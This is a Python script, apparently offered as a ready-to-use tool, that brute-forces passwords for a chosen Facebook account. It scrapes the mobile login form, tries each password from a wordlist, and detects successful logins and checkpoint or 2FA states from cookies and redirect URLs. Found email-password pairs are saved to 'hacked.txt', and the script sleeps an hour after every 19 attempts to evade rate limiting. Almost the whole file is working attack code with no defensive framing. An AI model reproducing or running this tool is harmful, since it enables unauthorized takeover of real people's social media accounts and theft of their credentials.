#coding: utf-8
import os.path
import requests,json,bs4
import sys,os,time
logo=""" \033[1;92m███████╗ █████╗  ██████╗███████╗██████╗  ██████╗  ██████╗ ██╗  ██╗
██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗██╔═══██╗██╔═══██╗██║ ██╔╝
█████╗  ███████║██║     █████╗  ██████╔╝██║   ██║██║   ██║█████╔╝
██╔══╝  ██╔══██║██║     ██╔══╝  ██╔══██╗██║   ██║██║   ██║██╔═██╗
██║     ██║  ██║╚██████╗███████╗██████╔╝╚██████╔╝╚██████╔╝██║  ██╗
╚═╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
BruteForce by Darius:"""
if sys.version_info[0] != 3:
  os.system('clear')
  print(logo)
  print(65 * '\033[1;92m=')
  print('''\t\tREQUIRED PYTHON 3.x\n\t\tinstall and try: python3 fb.py\n''')
  print(65 * '\033[1;92m=')
  sys.exit()
len_pass=0
MIN_PASSWORD_LENGTH = 6
## ang pag gaya sa code na ito ay hindi magiging dahilan para tawaging kang coder bigyan moko ng credit sa pag gaya mo at matutuwa pako
## copying this code will not be a reason to call you a coder give me credit for copying and I'll be happy
def save_cookies(cookies, header):
    try:
        os.mkdir("cookies")
    except OSError:
        pass
    for i in header.cookies:
        cookies[i.name]=i.value
    with open("cookies/cookies.json", "w") as cf:
        json.dump(cookies, cf)
    return True
def clean_cookie():
    cf = json.loads(open("cookies/cookies.json", "r").read())
    if "checkpoint" in cf:
        del cf["checkpoint"]
    
    with open("cookies/cookies.json", "w") as cookie:
        json.dump(cf, cookie)
    
    return
def save_Referer(page):
    with open("cookies/Referer.txt", "w") as f:
        f.write(str(page.url))
        f.close()
    return True
def find_input_fields(html):
    return bs4.BeautifulSoup(html, "html.parser", parse_only=bs4.SoupStrainer("input"))
def find_url(page):
    soup = bs4.BeautifulSoup(page, "html.parser")
    url = soup.find("form").get("action")
    return (f"https://m.facebook.com:443{url}")
def open_cookies():
    try:
        cf = open("cookies/cookies.json", "r").read()
        cookies = json.loads(cf)
    except IOError:
        cookies = {"fr":"0NFggJSEGI3pYX23U..BjKftf.wx.AAA.0.0.BjKftf.AWUytHdS_8E", "m_pixel_ratio":"3","locale":"en_US"}
    return cookies
def open_headers():
    try:
      header = {'User-Agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5'}
      header['Referer'] = open("cookies/Referer.txt", "r").read()
    except IOError:
        header={'User-Agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5'}
    return header
def browser(url, data=None, redirect=True):
    # cookies
    cookies = open_cookies()
    # header
    header = open_headers()
    # requests
    if data == None:
        #print(f"Browser get method {url}")
        page = requests.get(url, headers=header, cookies=cookies, allow_redirects=redirect)
    else:
        #print(f"Browser post method {url} data = {data}")
        page = requests.post(url, headers=header, data=data, cookies=cookies, allow_redirects=redirect)
    #log
    #print(f"Browser response url {page.url}")
    #function
    if save_cookies(cookies, page) and save_Referer(page):
        return page
def create_form():
    URL = 'https://m.facebook.com'
    page = browser(URL)
    soup = find_input_fields(page.text)
    action_url = find_url(page.text)
    data = dict(
        (elem["name"], elem["value"])
        for elem in soup
        if elem.has_attr("value") and elem.has_attr("name")
        )
    data["login"] = "Log in"
    if "sign_up" in data:
        del(data["sign_up"])
    return data, action_url


def na_hack_naba(email,password):
    while True:
        try:
            data, url = create_form()
            data['email'] = email
            data['pass'] = password
            page = browser(url, data=data)
            if "c_user" in page.cookies or "save-device" in page.url or "home.php" in page.url:
                open('hacked.txt', 'a').write(str(email+' | '+password+'\n'))
                print(65 * '\033[1;92m=')
                print('\n\033[1;93mPassword found Sir: \033[1;92m'+password+'\n')
                print(65 * '\033[1;92m=')
                os.system("rm -rf cookies")
                return True
            elif "checkpoint" in page.url and "approvals_code" in page.text:
                open('hack_but_checkpoint.txt', 'a').write(str(email+' | '+password+'\n'))

                print(65 * '\033[1;92m=')

                print('\n\033[1;93mPassword found 2FA auth required: \033[1;92m'+password+'\n')
                print(65 * '\033[1;92m=')
                os.system("rm -rf cookies")
                return True
                
            elif "checkpoint_title" in page.text or "checkpoint" in page.url:
                open('hack_but_checkpoint.txt', 'a').write(str(email+' | '+password+'\n'))
                print(65 * '\033[1;92m=')
                print('\n\033[1;93mPassword found but checkpoint: \033[1;92m'+password+'\n')
                print(65 * '\033[1;92m=')
                os.system("rm -rf cookies")
                return True
            else:
                return False
        except:
            pass
if __name__ == "__main__":
  os.system('reset')
  os.system('clear')
  print(logo)
  print(65 * '\033[1;92m=')
  print('\033[1;92mEmail/Username/Id/etc:')
  email = input('\033[1;94m==\033[1;92m>>> \033[1;91m').strip()
  print('\033[1;92m[+] Password File:')
  PASSWORD_FILE = input('\033[1;94m==\033[1;92m>>> \033[1;91m')
  if not os.path.isfile(PASSWORD_FILE):
    print("Password file not exist: ")
    sys.exit(0)
  else:
    try:
      password_data = open(PASSWORD_FILE, 'r').read().split("\n")
    except:
      print('\033[1;91m[!] Error reading file')
      sys.exit(1)
    print('\033[1;92m[+] Passwords Number {}'.format(str(len(password_data))))
    print(65 * '\033[1;92m=')
    try_number=0
    for index, password in zip(range(password_data.__len__()), password_data):
        password = password.strip()
        if len(password) < MIN_PASSWORD_LENGTH:
            continue
        print("\033[1;92mTrying password [ "+str(index)+" ]: \033[1;97m"+str(password))
        if na_hack_naba(email,password):
          break
        try_number+=1
        if try_number==19:
            print("\033[1;91m Sleep in one hour")
            time.sleep(3600)
            try_number=0